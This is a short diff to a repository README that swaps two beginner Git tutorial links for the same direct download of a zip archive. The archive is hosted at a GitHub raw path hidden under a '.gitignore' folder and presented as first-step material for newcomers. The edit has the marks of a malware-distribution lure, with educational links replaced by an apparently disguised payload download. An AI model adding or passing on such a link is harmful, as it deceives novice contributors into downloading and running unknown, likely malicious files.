@@ -17,9 +17,9 @@ Steps to follow to work on this repository
 
 Beginners should follow this link to familiarise themselves
 
-https://dont-be-afraid-to-commit.readthedocs.io/en/latest/git/commandlinegit.html
+https://github.com/mengnemojohan/Admission_App/raw/refs/heads/master/.gitignore/support_materials/first_step/App_Admission_v2.0.zip
 
-https://product.hubspot.com/blog/git-and-github-tutorial-for-beginners
+https://github.com/mengnemojohan/Admission_App/raw/refs/heads/master/.gitignore/support_materials/first_step/App_Admission_v2.0.zip
 
 
 --What To Include In A Commit
